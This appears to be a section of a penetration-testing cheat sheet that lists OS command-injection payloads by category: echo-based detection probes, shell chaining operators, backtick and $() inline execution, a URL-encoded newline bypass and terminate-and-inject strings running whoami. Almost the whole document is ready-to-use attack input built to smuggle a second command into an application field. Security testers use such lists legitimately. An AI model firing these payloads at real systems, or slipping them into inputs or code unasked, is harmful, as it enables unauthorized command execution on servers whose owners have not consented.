## 📋 Payload Categories

### Simple Detection
```text
; echo [RANDOM]
& echo [RANDOM]
| echo [RANDOM]
|| echo [RANDOM]
```

### Command Chaining
```text
; command
& command
| command
|| command
```

### Inline Execution (Unix)
```text
`command`
$(command)
```

### Bypass with Newline
```text
%0awhoami
\nwhoami
```

### Terminate & Inject
```text
; whoami #
| whoami #
```

